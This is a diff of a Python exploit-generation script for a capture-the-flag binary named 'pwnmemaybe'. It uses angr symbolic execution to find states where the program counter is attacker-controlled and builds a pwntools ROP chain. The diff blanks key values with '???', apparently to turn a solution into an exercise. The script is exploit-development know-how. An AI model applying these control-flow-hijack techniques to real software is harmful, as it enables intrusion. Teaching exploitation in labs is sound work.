@@ -25,7 +25,7 @@ def build_ropchain():
     write_target = e.bss()
     r = ROP([e])
 
-    r.call('we_want_to_go_there', [0])
+    r.call(???, [0])
 
     # print(r.dump())
     return r
@@ -40,7 +40,7 @@ while True:
     # Step 1: Open with radare2 for automated analysis, find address of main function 
 
     r2 = r2pipe.open('./pwnmemaybe')
-    r2.cmd('s main')
+    r2.cmd('s ???')
     main_symbol_str = r2.cmd('is.')
     main_addr = int(main_symbol_str.splitlines()[-1].split()[2], 16)
 
@@ -66,7 +66,7 @@ while True:
         if len(sm.unconstrained) > 0:
             print("found some unconstrained states, checking exploitability")
             for u in sm.unconstrained:
-                if fully_symbolic(u, u.regs.pc):
+                if fully_symbolic(u, u.regs.???):
                     exploitable_state = u
                     break
 
@@ -76,7 +76,7 @@ while True:
     print("found a state which looks exploitable")
     ep = exploitable_state
 
-    assert ep.solver.symbolic(ep.regs.pc), "PC must be symbolic at this point"
+    assert ep.solver.symbolic(ep.regs.???)
     print("success")
 
     # Step 4: Add additionnal constraint to make sure we can have some specific value written in instruction pointer
